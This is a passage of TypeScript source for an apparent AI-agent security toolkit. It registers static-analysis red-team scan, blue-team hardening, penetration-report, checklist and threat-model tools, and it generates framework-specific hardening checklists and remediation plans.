  lines.push('- [ ] JSON schema validation for webhook payloads')
  lines.push('- [ ] Request size limits configured')
  lines.push('')

  lines.push('## 3. Security Headers')
  lines.push('- [ ] Content-Security-Policy (CSP) configured')
  lines.push('- [ ] Strict-Transport-Security (HSTS) with preload')
  lines.push('- [ ] X-Content-Type-Options: nosniff')
  lines.push('- [ ] X-Frame-Options: DENY (or CSP frame-ancestors)')
  lines.push('- [ ] Referrer-Policy: strict-origin-when-cross-origin')
  lines.push('- [ ] Permissions-Policy (disable unused browser features)')
  lines.push('- [ ] X-Powered-By header removed')
  lines.push('- [ ] Server header removed or generic')
  lines.push('')

  lines.push('## 4. Cryptography')
  lines.push('- [ ] Passwords hashed with bcrypt/argon2id (not MD5/SHA)')
  lines.push('- [ ] Encryption at rest for sensitive data (AES-256-GCM)')
  lines.push('- [ ] TLS 1.2+ enforced for all connections')
  lines.push('- [ ] No hardcoded encryption keys or IVs')
  lines.push('- [ ] Secure random generation (crypto.randomBytes, not Math.random)')
  lines.push('- [ ] Timing-safe comparison for tokens/signatures')
  lines.push('- [ ] Certificate pinning for critical API connections')
  lines.push('- [ ] Key rotation policy in place')
  lines.push('')

  lines.push('## 5. Error Handling & Logging')
  lines.push('- [ ] Generic error messages to users (no stack traces)')
  lines.push('- [ ] Detailed errors logged server-side only')
  lines.push('- [ ] Security events logged (auth, access denied, rate limits)')
  lines.push('- [ ] Audit trail for data modifications')
  lines.push('- [ ] Log injection prevention (sanitize log inputs)')
  lines.push('- [ ] No sensitive data in logs (passwords, tokens, PII)')
  lines.push('- [ ] Log retention and rotation policy')
  lines.push('- [ ] Alerting on suspicious patterns')
  lines.push('')

  lines.push('## 6. Rate Limiting & DoS Prevention')
  lines.push('- [ ] Global rate limiting on all endpoints')
  lines.push('- [ ] Strict rate limiting on auth endpoints (5 per 15min)')
  lines.push('- [ ] Request body size limits')
  lines.push('- [ ] File upload size limits')
  lines.push('- [ ] Pagination limits (max page size)')
  lines.push('- [ ] Query complexity limits (GraphQL depth, width)')
  lines.push('- [ ] WebSocket message rate limiting')
  lines.push('- [ ] Slow-loris protection (connection timeouts)')
  lines.push('')

  lines.push('## 7. CORS & CSRF')
  lines.push('- [ ] CORS: specific origins (no wildcard with credentials)')
  lines.push('- [ ] CORS: only necessary methods and headers allowed')
  lines.push('- [ ] CSRF tokens for state-changing requests')
  lines.push('- [ ] SameSite cookie attribute set to Strict or Lax')
  lines.push('- [ ] Origin/Referer header validation')
  lines.push('')

  lines.push('## 8. Dependency Management')
  lines.push('- [ ] Lock file committed (package-lock.json / yarn.lock)')
  lines.push('- [ ] Regular dependency audits (npm audit / snyk)')
  lines.push('- [ ] Automated dependency updates (Dependabot / Renovate)')
  lines.push('- [ ] No known critical/high CVEs in dependencies')
  lines.push('- [ ] Pinned versions for CI/CD tooling')
  lines.push('- [ ] Supply chain verification (npm provenance)')
  lines.push('')

  lines.push('## 9. Secrets Management')
  lines.push('- [ ] No secrets in source code (scan with gitleaks/trufflehog)')
  lines.push('- [ ] .env files in .gitignore')
  lines.push('- [ ] Environment variables for all configuration')
  lines.push('- [ ] Secrets manager for production (AWS SM, Vault, Doppler)')
  lines.push('- [ ] Secret rotation policy')
  lines.push('- [ ] Different secrets per environment (dev/staging/prod)')
  lines.push('')

  lines.push('## 10. Infrastructure & Deployment')
  lines.push('- [ ] HTTPS everywhere (redirect HTTP to HTTPS)')
  lines.push('- [ ] Production debug mode disabled')
  lines.push('- [ ] Source maps disabled in production (or access-restricted)')
  lines.push('- [ ] Database not publicly accessible')
  lines.push('- [ ] Firewall rules: minimum necessary ports')
  lines.push('- [ ] Container: non-root user, read-only filesystem')
  lines.push('- [ ] CI/CD: pinned actions, no secrets in logs')
  lines.push('- [ ] Backup and disaster recovery tested')
  lines.push('')

  // Framework-specific checks
  if (framework === 'express') {
    lines.push('## Express.js Specific')
    lines.push('- [ ] helmet() middleware installed and configured')
    lines.push('- [ ] express-rate-limit on auth routes')
    lines.push('- [ ] cors() with specific origins')
    lines.push('- [ ] cookie-parser with signed cookies')
    lines.push('- [ ] express-session with secure store (Redis/Postgres)')
    lines.push('- [ ] body-parser limits configured ({ limit: "1mb" })')
    lines.push('- [ ] trust proxy configured correctly for reverse proxy')
    lines.push('- [ ] Error handling middleware (no default stack traces)')
    lines.push('- [ ] No express-validator bypasses')
    lines.push('- [ ] Disable x-powered-by: app.disable("x-powered-by")')
    lines.push('')
  }

  if (framework === 'nextjs') {
    lines.push('## Next.js Specific')
    lines.push('- [ ] Security headers in next.config.js')
    lines.push('- [ ] API routes: validate authentication')
    lines.push('- [ ] Server Components: no client data leaks')
    lines.push('- [ ] Middleware: auth check before page render')
    lines.push('- [ ] Environment variables: NEXT_PUBLIC_ only for safe values')
    lines.push('- [ ] Image optimization: restrict domains')
    lines.push('- [ ] rewrites/redirects: no open redirect patterns')
    lines.push('- [ ] getServerSideProps: validate user session')
    lines.push('- [ ] Server Actions: validate input, check auth')
    lines.push('- [ ] No sensitive data in client bundles')
    lines.push('')
  }

  if (framework === 'fastify') {
    lines.push('## Fastify Specific')
    lines.push('- [ ] @fastify/helmet registered')
    lines.push('- [ ] @fastify/rate-limit on auth routes')
    lines.push('- [ ] @fastify/cors with specific origins')
    lines.push('- [ ] @fastify/csrf-protection enabled')
    lines.push('- [ ] @fastify/secure-session configured')
    lines.push('- [ ] JSON schema validation on all routes')
    lines.push('- [ ] bodyLimit configured (default 1MB)')
    lines.push('- [ ] Error serializer: no stack traces in production')
    lines.push('- [ ] Trust proxy configured for reverse proxy')
    lines.push('')
  }

  if (framework === 'django') {
    lines.push('## Django Specific')
    lines.push('- [ ] DEBUG = False in production')
    lines.push('- [ ] SECRET_KEY from environment variable (not hardcoded)')
    lines.push('- [ ] ALLOWED_HOSTS configured')
    lines.push('- [ ] CSRF_COOKIE_SECURE = True')
    lines.push('- [ ] SESSION_COOKIE_SECURE = True')
    lines.push('- [ ] SESSION_COOKIE_HTTPONLY = True')
    lines.push('- [ ] SECURE_BROWSER_XSS_FILTER = True')
    lines.push('- [ ] SECURE_CONTENT_TYPE_NOSNIFF = True')
    lines.push('- [ ] SECURE_HSTS_SECONDS configured')
    lines.push('- [ ] SECURE_SSL_REDIRECT = True')
    lines.push('- [ ] SecurityMiddleware enabled')
    lines.push('- [ ] django.contrib.admin URL randomized')
    lines.push('- [ ] ORM used (no raw SQL with user input)')
    lines.push('- [ ] manage.py check --deploy passes')
    lines.push('')
  }

  if (framework === 'flask') {
    lines.push('## Flask Specific')
    lines.push('- [ ] app.debug = False in production')
    lines.push('- [ ] SECRET_KEY from environment variable')
    lines.push('- [ ] Flask-Talisman for security headers')
    lines.push('- [ ] Flask-WTF for CSRF protection')
    lines.push('- [ ] Flask-Limiter for rate limiting')
    lines.push('- [ ] Session cookie: httponly, secure, samesite')
    lines.push('- [ ] SQLAlchemy parameterized queries (no raw SQL)')
    lines.push('- [ ] Jinja2 auto-escaping enabled (default)')
    lines.push('- [ ] No render_template_string with user input')
    lines.push('- [ ] Blueprint-level auth decorators')
    lines.push('')
  }

  if (framework === 'rails') {
    lines.push('## Ruby on Rails Specific')
    lines.push('- [ ] config.force_ssl = true')
    lines.push('- [ ] secret_key_base from environment')
    lines.push('- [ ] Strong Parameters on all controllers')
    lines.push('- [ ] CSRF protection: protect_from_forgery')
    lines.push('- [ ] Content Security Policy configured')
    lines.push('- [ ] ActiveRecord: parameterized queries (no .where with string)')
    lines.push('- [ ] Brakeman scan passing')
    lines.push('- [ ] Mass assignment protection')
    lines.push('- [ ] Cookie: secure, httponly, same_site: :strict')
    lines.push('- [ ] Action Cable: authenticate connections')
    lines.push('- [ ] config.action_dispatch.default_headers configured')
    lines.push('')
  }

  return lines.join('\n')
}

// ── Tool Registration ──────────────────────────────────────────────────────────

export function registerRedBlueTools(): void {

  // ─── Tool 1: Red Team Scan ───────────────────────────────────────────────────

  registerTool({
    name: 'redteam_scan',
    description: 'Red team: scan a codebase for vulnerabilities. Reads source files and pattern-matches for secrets, injection vectors, auth issues, crypto weaknesses, dependency vulnerabilities, and configuration problems. Thinks like an attacker. Returns findings with severity, file, line, evidence, exploitation scenario, and CWE ID.',
    parameters: {
      path: { type: 'string', description: 'Directory to scan (default: current directory)' },
      focus: { type: 'string', description: 'Scan focus: "secrets", "injection", "auth", "crypto", "deps", "config", "all" (default: "all")' },
      depth: { type: 'string', description: 'Scan depth: "quick" (~200 files), "standard" (~1000 files), "deep" (~5000 files). Default: "standard"' },
    },
    tier: 'free',
    timeout: 120_000,
    async execute(args) {
      const scanPath = resolvePath(String(args.path || '.'))
      const focus = String(args.focus || 'all').toLowerCase()
      const depth = String(args.depth || 'standard').toLowerCase()

      if (!existsSync(scanPath)) {
        return `Error: Path does not exist: ${scanPath}`
      }

      const maxFiles = depth === 'quick' ? MAX_FILES_QUICK : depth === 'deep' ? MAX_FILES_DEEP : MAX_FILES_STANDARD
      const files = collectFiles(scanPath, maxFiles)

      if (files.length === 0) {
        return `No source files found in ${scanPath}. Check the path and ensure it contains code files.`
      }

      const allFindings: Finding[] = []
      const scanStart = Date.now()

      if (focus === 'all' || focus === 'secrets') {
        allFindings.push(...scanSecrets(files, scanPath))
      }
      if (focus === 'all' || focus === 'injection') {
        allFindings.push(...scanInjection(files, scanPath))
      }
      if (focus === 'all' || focus === 'auth') {
        allFindings.push(...scanAuth(files, scanPath))
      }
      if (focus === 'all' || focus === 'crypto') {
        allFindings.push(...scanCrypto(files, scanPath))
      }
      if (focus === 'all' || focus === 'deps') {
        allFindings.push(...scanDeps(files, scanPath))
      }
      if (focus === 'all' || focus === 'config') {
        allFindings.push(...scanConfig(files, scanPath))
      }

      const scanDuration = Date.now() - scanStart
      const counts = severityCounts(allFindings)

      const lines: string[] = [
        '# Red Team Scan Results',
        '',
        `**Target**: \`${scanPath}\``,
        `**Scan Depth**: ${depth} (${files.length} files scanned)`,
        `**Focus**: ${focus}`,
        `**Duration**: ${scanDuration}ms`,
        `**Risk Score**: ${calculateRiskScore(allFindings)}/100 (Grade: ${riskGrade(calculateRiskScore(allFindings))})`,
        '',
        '## Summary',
        '',
        `| Severity | Count |`,
        `|----------|-------|`,
        `| CRITICAL | ${counts.critical} |`,
        `| HIGH     | ${counts.high} |`,
        `| MEDIUM   | ${counts.medium} |`,
        `| LOW      | ${counts.low} |`,
        `| **Total** | **${allFindings.length}** |`,
        '',
      ]

      if (allFindings.length === 0) {
        lines.push('No vulnerabilities found. The codebase appears clean for the scanned categories.')
        lines.push('')
        lines.push('**Note**: This is a static analysis tool. It may miss vulnerabilities that require:')
        lines.push('- Dynamic testing (fuzzing, pen testing)')
        lines.push('- Authentication flow analysis')
        lines.push('- Business logic review')
        lines.push('- Runtime dependency behavior')
      } else {
        // Group by category
        const categories = new Map<string, Finding[]>()
        for (const f of allFindings) {
          const cat = categories.get(f.category) || []
          cat.push(f)
          categories.set(f.category, cat)
        }

        for (const [category, findings] of Array.from(categories.entries())) {
          lines.push(`## ${category} (${findings.length} findings)`)
          lines.push('')
          lines.push(formatFindings(findings))
        }

        // Top 5 most critical
        const topFindings = allFindings
          .sort((a, b) => SEVERITY_SCORE[b.severity] - SEVERITY_SCORE[a.severity])
          .slice(0, 5)

        lines.push('## Priority Remediation (Top 5)')
        lines.push('')
        for (let i = 0; i < topFindings.length; i++) {
          const f = topFindings[i]
          lines.push(`${i + 1}. **${f.severity.toUpperCase()}** — ${f.title} in \`${f.file}:${f.line}\``)
          if (f.remediation) lines.push(`   Fix: ${f.remediation}`)
        }
      }

      return lines.join('\n')
    },
  })

  // ─── Tool 2: Blue Team Harden ────────────────────────────────────────────────

  registerTool({
    name: 'blueteam_harden',
    description: 'Blue team: generate security hardening recommendations with ready-to-use code snippets. Produces security headers middleware, input validation patterns, auth hardening, crypto best practices, and logging/monitoring setup. Returns actionable code that can be directly applied.',
    parameters: {
      path: { type: 'string', description: 'Directory to analyze for context (default: current directory)' },
      focus: { type: 'string', description: 'Hardening focus: "headers", "auth", "input", "crypto", "logging", "all" (default: "all")' },
    },
    tier: 'free',
    timeout: 60_000,
    async execute(args) {
      const hardenPath = resolvePath(String(args.path || '.'))
      const focus = String(args.focus || 'all').toLowerCase()

      // Quick scan to understand the codebase context
      const files = collectFiles(hardenPath, 500)
      const hasExpress = files.some(f => /express/i.test(f.content))
      const hasFastify = files.some(f => /fastify/i.test(f.content))
      const hasNextjs = files.some(f => /next/i.test(f.path) || /next\.config/i.test(f.path))
      const hasDjango = files.some(f => /django/i.test(f.content))
      const hasFlask = files.some(f => /flask/i.test(f.content))
      const hasKoa = files.some(f => /koa/i.test(f.content))

      const framework = hasExpress ? 'Express.js' :
        hasFastify ? 'Fastify' :
        hasNextjs ? 'Next.js' :
        hasDjango ? 'Django' :
        hasFlask ? 'Flask' :
        hasKoa ? 'Koa' :
        'Generic'

      const lines: string[] = [
        '# Blue Team Hardening Recommendations',
        '',
        `**Target**: \`${hardenPath}\``,
        `**Detected Framework**: ${framework}`,
        `**Files Analyzed**: ${files.length}`,
        '',
        '---',
        '',
      ]

      // Run a quick red team scan to identify what needs hardening
      const findings: Finding[] = []
      findings.push(...scanSecrets(files, hardenPath))
      findings.push(...scanInjection(files, hardenPath))
      findings.push(...scanAuth(files, hardenPath))
      findings.push(...scanCrypto(files, hardenPath))
      findings.push(...scanConfig(files, hardenPath))

      if (findings.length > 0) {
        const counts = severityCounts(findings)
        lines.push('## Current Vulnerability Summary')
        lines.push('')
        lines.push(`Found **${findings.length}** issues (${counts.critical} critical, ${counts.high} high, ${counts.medium} medium, ${counts.low} low)`)
        lines.push('')
        lines.push('The hardening recommendations below directly address these findings.')
        lines.push('')
        lines.push('---')
        lines.push('')
      }

      if (focus === 'all' || focus === 'headers') {
        lines.push(generateSecurityHeaders())
      }

      if (focus === 'all' || focus === 'input') {
        lines.push(generateInputValidation())
      }

      if (focus === 'all' || focus === 'auth') {
        lines.push(generateAuthHardening())
      }

      if (focus === 'all' || focus === 'crypto') {
        lines.push(generateCryptoBestPractices())
      }

      if (focus === 'all' || focus === 'logging') {
        lines.push(generateLoggingPatterns())
      }

      // Add quick-apply section
      lines.push('---')
      lines.push('')
      lines.push('## Quick-Apply Commands')
      lines.push('')

      if (hasExpress || framework === 'Generic') {
        lines.push('### Install Security Dependencies')
        lines.push('```bash')
        lines.push('npm install helmet express-rate-limit cors csurf argon2 zod winston')
        lines.push('npm install -D @types/express-rate-limit @types/csurf')
        lines.push('```')
        lines.push('')
      }

      if (hasFastify) {
        lines.push('### Install Security Dependencies')
        lines.push('```bash')
        lines.push('npm install @fastify/helmet @fastify/rate-limit @fastify/cors @fastify/csrf-protection argon2 zod')
        lines.push('```')
        lines.push('')
      }

      if (hasNextjs) {
        lines.push('### Install Security Dependencies')
        lines.push('```bash')
        lines.push('npm install argon2 zod next-safe')
        lines.push('```')
        lines.push('')
      }

      lines.push('### Secret Scanning')
      lines.push('```bash')
      lines.push('# Install and run gitleaks')
      lines.push('brew install gitleaks  # or: go install github.com/gitleaks/gitleaks/v8@latest')
      lines.push('gitleaks detect --source . --verbose')
      lines.push('')
      lines.push('# Or use trufflehog')
      lines.push('npx trufflehog filesystem --directory=. --only-verified')
      lines.push('```')
      lines.push('')

      lines.push('### Dependency Audit')
      lines.push('```bash')
      lines.push('npm audit')
      lines.push('npm audit fix')
      lines.push('npx better-npm-audit audit')
      lines.push('```')

      return lines.join('\n')
    },
  })

  // ─── Tool 3: Red Team Report ─────────────────────────────────────────────────

  registerTool({
    name: 'redteam_report',
    description: 'Generate a professional penetration test report. Runs a full red team scan and formats results as an executive assessment with risk score, attack surface mapping, critical findings with exploitation scenarios, risk matrix, and prioritized remediation plan.',
    parameters: {
      path: { type: 'string', description: 'Directory to assess (default: current directory)' },
    },
    tier: 'free',
    timeout: 180_000,
    async execute(args) {
      const reportPath = resolvePath(String(args.path || '.'))

      if (!existsSync(reportPath)) {
        return `Error: Path does not exist: ${reportPath}`
      }

      const files = collectFiles(reportPath, MAX_FILES_DEEP)

      if (files.length === 0) {
        return `No source files found in ${reportPath}.`
      }

      const scanStart = Date.now()

      // Run all scans
      const secretFindings = scanSecrets(files, reportPath)
      const injectionFindings = scanInjection(files, reportPath)
      const authFindings = scanAuth(files, reportPath)
      const cryptoFindings = scanCrypto(files, reportPath)
      const depFindings = scanDeps(files, reportPath)
      const configFindings = scanConfig(files, reportPath)

      const allFindings = [
        ...secretFindings,
        ...injectionFindings,
        ...authFindings,
        ...cryptoFindings,
        ...depFindings,
        ...configFindings,
      ]

      const scanDuration = Date.now() - scanStart
      const riskScore = calculateRiskScore(allFindings)
      const grade = riskGrade(riskScore)
      const counts = severityCounts(allFindings)

      // Determine tech stack
      const techStack: string[] = []
      if (files.some(f => f.ext === '.ts' || f.ext === '.tsx')) techStack.push('TypeScript')
      if (files.some(f => f.ext === '.js' || f.ext === '.jsx')) techStack.push('JavaScript')
      if (files.some(f => f.ext === '.py')) techStack.push('Python')
      if (files.some(f => f.ext === '.go')) techStack.push('Go')
      if (files.some(f => f.ext === '.java')) techStack.push('Java')
      if (files.some(f => f.ext === '.rb')) techStack.push('Ruby')
      if (files.some(f => f.ext === '.rs')) techStack.push('Rust')
      if (files.some(f => f.ext === '.php')) techStack.push('PHP')
      if (files.some(f => f.ext === '.c' || f.ext === '.cpp')) techStack.push('C/C++')
      if (files.some(f => f.ext === '.cs')) techStack.push('C#')

      // Count unique vulnerable files
      const vulnerableFiles = new Set(allFindings.map(f => f.file))

      const lines: string[] = []

      // ── Executive Summary ──
      lines.push('# Penetration Test Report')
      lines.push('')
      lines.push('---')
      lines.push('')
      lines.push('## Executive Summary')
      lines.push('')
      lines.push(`| Metric | Value |`)
      lines.push(`|--------|-------|`)
      lines.push(`| **Target** | \`${reportPath}\` |`)
      lines.push(`| **Assessment Date** | ${new Date().toISOString().split('T')[0]} |`)
      lines.push(`| **Files Scanned** | ${files.length} |`)
      lines.push(`| **Vulnerable Files** | ${vulnerableFiles.size} (${((vulnerableFiles.size / files.length) * 100).toFixed(1)}%) |`)
      lines.push(`| **Tech Stack** | ${techStack.join(', ') || 'Unknown'} |`)
      lines.push(`| **Scan Duration** | ${(scanDuration / 1000).toFixed(1)}s |`)
      lines.push(`| **Risk Score** | **${riskScore}/100** |`)
      lines.push(`| **Risk Grade** | **${grade}** |`)
      lines.push('')

      // Risk summary paragraph
      if (riskScore === 0) {
        lines.push('The codebase shows no detected vulnerabilities from static analysis. This is a positive indicator but does not guarantee security. Dynamic testing, manual review, and runtime analysis are recommended for comprehensive assurance.')
      } else if (riskScore <= 15) {
        lines.push(`The codebase has a **low risk** posture with ${allFindings.length} findings. Most issues are minor and can be addressed in normal development cycles. No critical exploitation paths were identified.`)
      } else if (riskScore <= 30) {
        lines.push(`The codebase has a **moderate risk** posture with ${allFindings.length} findings across ${vulnerableFiles.size} files. Several issues require attention, particularly ${counts.critical > 0 ? 'the critical findings' : 'the high-severity findings'} which should be prioritized.`)
      } else if (riskScore <= 50) {
        lines.push(`The codebase has a **high risk** posture with ${allFindings.length} findings. **${counts.critical} critical** and **${counts.high} high** severity issues require immediate attention. An attacker with access to this code could exploit multiple vulnerability classes.`)
      } else {
        lines.push(`The codebase has a **critical risk** posture with ${allFindings.length} findings. **${counts.critical} critical** vulnerabilities present immediate exploitation risks. Remediation should begin immediately, starting with secret rotation and injection fixes.`)
      }
      lines.push('')

      // ── Findings Summary Table ──
      lines.push('## Findings Summary')
      lines.push('')
      lines.push('| Severity | Count | Categories |')
      lines.push('|----------|-------|------------|')

      const criticalCats = Array.from(new Set(allFindings.filter(f => f.severity === 'critical').map(f => f.category))).join(', ')
      const highCats = Array.from(new Set(allFindings.filter(f => f.severity === 'high').map(f => f.category))).join(', ')
      const mediumCats = Array.from(new Set(allFindings.filter(f => f.severity === 'medium').map(f => f.category))).join(', ')
      const lowCats = Array.from(new Set(allFindings.filter(f => f.severity === 'low').map(f => f.category))).join(', ')

      lines.push(`| CRITICAL | ${counts.critical} | ${criticalCats || '-'} |`)
      lines.push(`| HIGH | ${counts.high} | ${highCats || '-'} |`)
      lines.push(`| MEDIUM | ${counts.medium} | ${mediumCats || '-'} |`)
      lines.push(`| LOW | ${counts.low} | ${lowCats || '-'} |`)
      lines.push(`| **TOTAL** | **${allFindings.length}** | |`)
      lines.push('')

      // ── Attack Surface Map ──
      lines.push('## Attack Surface Map')
      lines.push('')

      const attackSurface: Record<string, string[]> = {
        'Entry Points': [],
        'Data Stores': [],
        'Authentication': [],
        'External Integrations': [],
        'Sensitive Operations': [],
      }

      for (const file of files) {
        const rel = relative(reportPath, file.path)
        if (/(?:route|api|endpoint|controller|handler|server|app)\./i.test(rel)) {
          attackSurface['Entry Points'].push(rel)
        }
        if (/(?:database|db|model|schema|migration|prisma|drizzle)/i.test(rel)) {
          attackSurface['Data Stores'].push(rel)
        }
        if (/(?:auth|login|session|passport|oauth|jwt)/i.test(rel)) {
          attackSurface['Authentication'].push(rel)
        }
        if (/(?:email|payment|stripe|webhook|notify|sms)/i.test(rel) || /(?:fetch|axios|http|request)/i.test(rel)) {
          if (attackSurface['External Integrations'].length < 10) {
            attackSurface['External Integrations'].push(rel)
          }
        }
        if (/(?:upload|crypto|encrypt|admin|deploy)/i.test(rel)) {
          attackSurface['Sensitive Operations'].push(rel)
        }
      }

      for (const [surface, paths] of Object.entries(attackSurface)) {
        if (paths.length > 0) {
          lines.push(`### ${surface}`)
          for (const p of paths.slice(0, 10)) {
            lines.push(`- \`${p}\``)
          }
          if (paths.length > 10) {
            lines.push(`- _+${paths.length - 10} more_`)
          }
          lines.push('')
        }
      }

      // ── Risk Matrix ──
      lines.push('## Risk Matrix')
      lines.push('')
      lines.push('| | Low Impact | Medium Impact | High Impact | Critical Impact |')
      lines.push('|---|---|---|---|---|')

      const matrixCells = (likelihood: string) => {
        const findingsForLikelihood = allFindings.filter(f => {
          if (likelihood === 'High') return f.severity === 'critical' || f.severity === 'high'
          if (likelihood === 'Medium') return f.severity === 'medium'
          return f.severity === 'low'
        })
        const impacts: Record<string, number> = { low: 0, medium: 0, high: 0, critical: 0 }
        for (const f of findingsForLikelihood) {
          impacts[f.severity]++
        }
        return `| **${likelihood} Likelihood** | ${impacts.low || '-'} | ${impacts.medium || '-'} | ${impacts.high || '-'} | ${impacts.critical || '-'} |`
      }

      lines.push(matrixCells('High'))
      lines.push(matrixCells('Medium'))
      lines.push(matrixCells('Low'))
      lines.push('')

      // ── Critical Findings Detail ──
      if (allFindings.length > 0) {
        const criticalFindings = allFindings
          .filter(f => f.severity === 'critical' || f.severity === 'high')
          .sort((a, b) => SEVERITY_SCORE[b.severity] - SEVERITY_SCORE[a.severity])

        if (criticalFindings.length > 0) {
          lines.push('## Critical & High Findings')
          lines.push('')
          lines.push(formatFindings(criticalFindings.slice(0, 20)))
        }

        const otherFindings = allFindings.filter(f => f.severity === 'medium' || f.severity === 'low')
        if (otherFindings.length > 0) {
          lines.push('## Medium & Low Findings')
          lines.push('')
          if (otherFindings.length > 15) {
            lines.push(formatFindings(otherFindings.slice(0, 15)))
            lines.push(`_+${otherFindings.length - 15} additional findings omitted for brevity._`)
            lines.push('')
          } else {
            lines.push(formatFindings(otherFindings))
          }
        }
      }

      // ── Remediation Plan ──
      lines.push('## Prioritized Remediation Plan')
      lines.push('')

      if (counts.critical > 0) {
        lines.push('### Phase 1 — Immediate (0-24 hours)')
        lines.push('')
        const criticals = allFindings.filter(f => f.severity === 'critical')
        for (const f of criticals.slice(0, 10)) {
          lines.push(`- [ ] **${f.title}** in \`${f.file}:${f.line}\``)
          if (f.remediation) lines.push(`  - ${f.remediation}`)
        }
        lines.push('')
      }

      if (counts.high > 0) {
        lines.push(`### Phase 2 — Short-term (1-7 days)`)
        lines.push('')
        const highs = allFindings.filter(f => f.severity === 'high')
        for (const f of highs.slice(0, 10)) {
          lines.push(`- [ ] **${f.title}** in \`${f.file}:${f.line}\``)
          if (f.remediation) lines.push(`  - ${f.remediation}`)
        }
        lines.push('')
      }

      if (counts.medium > 0) {
        lines.push(`### Phase 3 — Medium-term (1-4 weeks)`)
        lines.push('')
        const mediums = allFindings.filter(f => f.severity === 'medium')
        for (const f of mediums.slice(0, 10)) {
          lines.push(`- [ ] **${f.title}** in \`${f.file}:${f.line}\``)
        }
        lines.push('')
      }

      if (counts.low > 0) {
        lines.push(`### Phase 4 — Long-term (ongoing)`)
        lines.push('')
        const lows = allFindings.filter(f => f.severity === 'low')
        lines.push(`- [ ] Address ${lows.length} low-severity findings during regular maintenance`)
        lines.push('- [ ] Implement automated security scanning in CI/CD pipeline')
        lines.push('- [ ] Schedule quarterly security reviews')
        lines.push('')
      }

      lines.push('---')
      lines.push('')
      lines.push('_Report generated by kbot redteam_report. This is a static analysis tool._')
      lines.push('_For comprehensive security assessment, combine with dynamic testing, manual penetration testing, and runtime analysis._')

      return lines.join('\n')
    },
  })

  // ─── Tool 4: Blue Team Checklist ─────────────────────────────────────────────

  registerTool({
    name: 'blueteam_checklist',
    description: 'Generate a comprehensive security hardening checklist tailored to a specific framework. Covers authentication, input validation, security headers, cryptography, logging, rate limiting, CORS/CSRF, dependency management, secrets, and infrastructure. Returns checkboxes for tracking completion.',
    parameters: {
      framework: { type: 'string', description: 'Framework: "express", "nextjs", "fastify", "django", "flask", "rails", "generic" (default: "generic")' },
    },
    tier: 'free',
    timeout: 30_000,
    async execute(args) {
      const framework = String(args.framework || 'generic').toLowerCase()

      const validFrameworks = ['express', 'nextjs', 'fastify', 'django', 'flask', 'rails', 'generic']
      if (!validFrameworks.includes(framework)) {
        return `Invalid framework: "${framework}". Valid options: ${validFrameworks.join(', ')}`
      }

      return generateChecklist(framework)
    },
  })

  // ─── Tool 5: Threat Model ────────────────────────────────────────────────────

  registerTool({
    name: 'threat_model',
    description: 'Perform threat modeling on a codebase. Analyzes code structure to identify data flows, trust boundaries, and threats. Supports STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege), DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability), and PASTA (Process for Attack Simulation and Threat Analysis) methodologies.',
    parameters: {
      path: { type: 'string', description: 'Directory to analyze (default: current directory)' },
      methodology: { type: 'string', description: 'Methodology: "stride", "dread", "pasta" (default: "stride")' },
    },
    tier: 'free',
    timeout: 120_000,
    async execute(args) {
      const modelPath = resolvePath(String(args.path || '.'))
      const methodology = String(args.methodology || 'stride').toLowerCase()

      if (!existsSync(modelPath)) {
        return `Error: Path does not exist: ${modelPath}`
      }

      const validMethods = ['stride', 'dread', 'pasta']
      if (!validMethods.includes(methodology)) {
        return `Invalid methodology: "${methodology}". Valid options: ${validMethods.join(', ')}`
      }

      const files = collectFiles(modelPath, MAX_FILES_STANDARD)

      if (files.length === 0) {
        return `No source files found in ${modelPath}.`
      }

      // Determine tech stack
      const techStack: string[] = []
      if (files.some(f => f.ext === '.ts' || f.ext === '.tsx')) techStack.push('TypeScript')
      if (files.some(f => f.ext === '.js' || f.ext === '.jsx')) techStack.push('JavaScript')
      if (files.some(f => f.ext === '.py')) techStack.push('Python')
      if (files.some(f => f.ext === '.go')) techStack.push('Go')
      if (files.some(f => f.ext === '.java')) techStack.push('Java')
      if (files.some(f => f.ext === '.rb')) techStack.push('Ruby')
      if (files.some(f => f.ext === '.rs')) techStack.push('Rust')
      if (files.some(f => f.ext === '.php')) techStack.push('PHP')

      // Detect components
      const components: Record<string, string[]> = {}
      for (const file of files) {
        const rel = relative(modelPath, file.path)
        const dir = rel.split('/')[0]
        if (!components[dir]) components[dir] = []
        if (components[dir].length < 5) components[dir].push(rel)
      }

      let threats: ThreatEntry[]

      switch (methodology) {
        case 'stride':
          threats = analyzeSTRIDE(files, modelPath)
          break
        case 'dread':
          threats = analyzeDREAD(files, modelPath)
          break
        case 'pasta':
          threats = analyzePASTA(files, modelPath)
          break
        default:
          threats = analyzeSTRIDE(files, modelPath)
      }

      const lines: string[] = [
        `# Threat Model — ${methodology.toUpperCase()}`,
        '',
        `**Target**: \`${modelPath}\``,
        `**Methodology**: ${methodology.toUpperCase()}`,
        `**Files Analyzed**: ${files.length}`,
        `**Tech Stack**: ${techStack.join(', ') || 'Unknown'}`,
        `**Date**: ${new Date().toISOString().split('T')[0]}`,
        '',
        '---',
        '',
      ]

      // System Overview
      lines.push('## System Overview')
      lines.push('')
      lines.push('### Components')
      lines.push('')
      for (const [dir, paths] of Object.entries(components)) {
        if (paths.length > 0) {
          lines.push(`- **${dir}/**: ${paths.length} files`)
        }
      }
      lines.push('')

      // Trust Boundaries
      lines.push('### Trust Boundaries')
      lines.push('')
      lines.push('```')
      lines.push('Internet')
      lines.push('  |')
      lines.push('  | [TLS/HTTPS]')
      lines.push('  |')
      lines.push('  v')
      lines.push('CDN / Load Balancer')
      lines.push('  |')
      lines.push('  | [Trust Boundary 1: External -> Application]')
      lines.push('  |')
      lines.push('  v')
      lines.push('Application Server')
      lines.push('  |--- Static Assets')
      lines.push('  |--- API Routes ---- [Auth Middleware] ---- Protected Resources')
      lines.push('  |--- WebSocket')
      lines.push('  |')
      lines.push('  | [Trust Boundary 2: Application -> Data]')
      lines.push('  |')
      lines.push('  v')
      lines.push('Database / Cache / File Storage')
      lines.push('  |')
      lines.push('  | [Trust Boundary 3: Internal -> External Services]')
      lines.push('  |')
      lines.push('  v')
      lines.push('Third-Party APIs (Payment, Email, Auth providers)')
      lines.push('```')
      lines.push('')

      // Data Flows
      lines.push('### Data Flows')
      lines.push('')

      const hasAuth = files.some(f => /(?:auth|login|session)/i.test(f.path))
      const hasApi = files.some(f => /(?:api|route|endpoint)/i.test(f.path))
      const hasDb = files.some(f => /(?:database|db|model|schema)/i.test(f.path))
